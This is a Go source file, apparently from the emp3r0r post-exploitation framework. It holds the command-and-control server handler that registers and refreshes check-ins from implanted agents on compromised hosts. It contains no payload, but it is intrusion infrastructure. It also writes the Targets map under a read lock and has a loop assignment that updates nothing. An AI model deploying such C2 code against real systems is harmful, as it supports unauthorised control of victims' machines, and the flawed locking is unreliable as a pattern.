package cc

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// handleAgentCheckIn processes agent check-in requests.
func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
	conn, err := h2conn.Accept(wrt, req)
	defer func() {
		_ = conn.Close()
		if Logger.Level >= 4 {
			LogDebug("handleAgentCheckIn finished")
		}
	}()
	if err != nil {
		LogError("handleAgentCheckIn: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	var target emp3r0r_def.Emp3r0rAgent
	in := json.NewDecoder(conn)
	err = in.Decode(&target)
	if err != nil {
		LogWarning("handleAgentCheckIn decode error: %v", err)
		return
	}
	target.From = req.RemoteAddr
	if !IsAgentExist(&target) {
		inx := assignTargetIndex()
		TargetsMutex.RLock()
		Targets[&target] = &Control{Index: inx, Conn: nil}
		TargetsMutex.RUnlock()
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(AgentsJSON) {
			if l := SetAgentLabel(&target); l != "" {
				shortname = l
			}
		}
		LogMsg("Checked in: %s from %s, running %s", strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport), strconv.Quote(target.OS))
		ListTargets()
	} else {
		for a := range Targets {
			if a.Tag == target.Tag {
				a = &target
				break
			}
		}
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(AgentsJSON) {
			if l := SetAgentLabel(&target); l != "" {
				shortname = l
			}
		}
		if Logger.Level >= 4 {
			LogDebug("Refreshing sysinfo for %s from %s, running %s", shortname, fmt.Sprintf("%s - %s", target.From, target.Transport), strconv.Quote(target.OS))
		}
	}
}
